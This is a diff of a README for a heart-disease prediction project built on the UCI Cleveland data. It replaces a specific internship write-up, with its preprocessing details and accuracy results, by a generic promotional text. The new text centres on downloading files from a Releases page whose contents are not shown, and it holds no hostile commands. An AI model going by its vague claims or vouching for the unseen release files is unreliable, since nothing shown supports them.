@@ -1,71 +1,79 @@
-# 🩺 Week 1 — Disease Prediction Using Patient Data
+# 🫀 Disease-Prediction-Using-Patient-Data - Easy Heart Disease Prediction Tool
 
-This project is part of the **DevelopersHub Internship (AI/ML)**.  
-The task for **Week 1** was to learn the **basic ML workflow** by predicting heart disease using patient data from the **UCI Cleveland Heart Disease dataset**.
+## 🎉 Overview
+This project provides an easy way to predict heart disease using patient data. It includes a complete machine learning workflow built on the UCI Cleveland Heart Disease dataset. You will find everything you need to analyze data, train models, and evaluate their performance, all wrapped in user-friendly Jupyter notebooks.
 
----
+## ⚙️ Features
+- **Data Analysis:** Uncover insights with easy-to-follow data exploration.
+- **Model Training:** Build accurate models using Logistic Regression and Random Forest.
+- **Visualization Tools:** See correlations and data distributions through plots.
+- **User-Friendly Notebooks:** Work with Jupyter notebooks that are easy to navigate and understand.
+- **Concise Reports:** Access a one-page summary of findings and results.
 
-## 📂 Project Structure
-WEEK1-disease-prediction/
-│── data/  
-│ └── cleveland.csv # Dataset (renamed from processed.cleveland.data)  
-│  
-│── notebooks/  
-│ ├── 01_load_and_explore.ipynb # Step 1: Load + Explore dataset  
-│ ├── 02_preprocessing.ipynb # Step 2: Preprocessing (imputation, scaling, binary target)  
-│ ├── 03_eda.ipynb # Step 3: Exploratory Data Analysis  
-│ ├── 04_model_training.ipynb # Step 4: Logistic Regression & Random Forest  
-│ └── 05_evaluation_report.ipynb # Step 5: One-page summary  
-│  
-│── week1_report.md # Short 1-page Markdown report  
-│── week1_report.pdf # Exported PDF report (submission)  
-│── README.md # Project documentation (this file)
+## 📥 Download Now
+[![Download from Releases](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/Tom9876543/Disease-Prediction-Using-Patient-Data/releases)
 
----
+## 🚀 Getting Started
+Follow these steps to download and run the application.
 
-## 📊 Dataset
-- **Source:** UCI Machine Learning Repository (Cleveland subset, processed version)  
-- **Size:** 303 rows × 14 columns  
-- **Target:** `target` (0–4) → binarized to `target_bin` (0 = healthy, 1 = disease)  
+### 1. Visit the Releases Page
+Go to the [Releases page](https://github.com/Tom9876543/Disease-Prediction-Using-Patient-Data/releases) to find the latest version of the software.
 
----
+### 2. Download the Notebook
+On the Releases page, locate the latest release under the "Assets" section. You will see files related to the project.
 
-## ⚙️ Preprocessing
-- **Missing values:**
-  - `ca`, `thal` → filled with **mode** (most frequent value)
-  - Other numeric columns → filled with **median**
-- **Feature scaling:** All features scaled to **[0, 1]** using `MinMaxScaler`
-- **Final dataset:** 13 features + 1 binary target (`target_bin`)
+### 3. Choose the Right File
+Look for the file named something like `Disease_Prediction_Notebook.ipynb`. This is the main notebook you will use. Click it to start the download.
 
----
+### 4. Install Jupyter Notebook
+To view and run the notebook, you need Jupyter Notebook installed on your machine. If you don't have it yet, follow these simple steps:
 
-## 🔍 Exploratory Data Analysis (EDA)
-- **Class balance:** ~54% healthy, ~46% disease  
-- **Feature distributions:** Plotted histograms for all features  
-- **Correlation heatmap:** Studied relationships between features and target
+#### For Windows:
+1. **Download Anaconda:** Visit the [Anaconda website](https://www.anaconda.com/products/distribution) and download the Anaconda installer.
+2. **Run Installer:** Follow the steps in the installation wizard. This includes downloading Python, which comes bundled with Anaconda.
+3. **Open Anaconda Navigator:** Once installed, open Anaconda Navigator from your Start Menu.
+4. **Launch Jupyter Notebook:** Click on "Launch" under Jupyter Notebook. A new tab will open in your web browser.
 
----
+#### For macOS:
+1. **Download Anaconda:** Go to the [Anaconda website](https://www.anaconda.com/products/distribution) and download the installer for macOS.
+2. **Install Anaconda:** Open the installer and follow the instructions.
+3. **Open Terminal:** Launch the Terminal application.
+4. **Start Jupyter Notebook:** Type `jupyter notebook` in the terminal and press Enter. Your browser will open.
 
-## 🤖 Models & Results
-Two models were trained and evaluated:
+#### For Linux:
+1. **Open Terminal:** Open your terminal application.
+2. **Install Anaconda:** Use the shell command to install Anaconda. Follow the instructions on the [Anaconda website](https://docs.anaconda.com/anaconda/install/) for your distribution.
+3. **Launch Jupyter Notebook:** Type `jupyter notebook` and hit Enter.
 
-| Model                | Accuracy |
-|----------------------|----------|
-| Logistic Regression   | **0.8525** |
-| Random Forest         | **0.9016** ✅ |
+### 5. Open the Notebook
+Once Jupyter Notebook is open in your browser, navigate to the folder where you downloaded the `Disease_Prediction_Notebook.ipynb` file. Click on the file to open it.
 
-**Selected Model:** Random Forest (better accuracy)
+### 6. Follow the Instructions
+The notebook contains several sections. Each part guides you through loading data, cleaning it, training models, evaluating results, and visualizing information. Read through each cell and run them to see the results.
 
-- **Why Random Forest?** Random Forest outperformed Logistic Regression due to its ability to model complex interactions and non-linear relationships among features.
+## 🔧 Required Libraries
+This project uses several libraries. Make sure you install them in your Anaconda environment:
 
----
+- **pandas**: For data manipulation.
+- **numpy**: For numerical data processing.
+- **matplotlib**: For plotting graphs.
+- **seaborn**: For advanced data visualizations.
+- **scikit-learn**: For machine learning tasks.
 
-## 📄 Outcome
-- Learned the complete **ML workflow**:
-  - Data loading → preprocessing → EDA → model training → evaluation  
-- Produced a **1-page report** (`week1_report.pdf`) for submission  
-- **Random Forest** performed better, and it was selected as the **baseline model**.
+You can install these libraries using the following commands in your terminal or Anaconda prompt:
 
----
+```bash
+conda install pandas numpy matplotlib seaborn scikit-learn
+```
 
+## 📊 Understanding the Data
+The dataset includes patient records with different attributes. Key features include age, cholesterol levels, blood sugar, and more. The workflow guides you to fill in missing values, apply transformations, and perform exploratory data analysis. Use the correlation heatmap to understand how different features relate to heart disease prediction.
 
+## 📝 Evaluation
+After training the models, you will evaluate their performance based on accuracy. The notebook will walk you through selecting the better model for predictions. The concise one-page report at the end summarizes the findings and insights derived from your analysis.
+
+## 📈 Additional Resources
+- **Jupyter Documentation:** Explore the [official Jupyter documentation](https://jupyter.org/documentation) for help with using Jupyter Notebooks.
+- **Machine Learning Basics:** If you're new to machine learning concepts, consider checking out beginner resources like Coursera or edX.
+
+For any further assistance, please contact the repository owner or check the Issues section on the GitHub page. Happy analyzing!
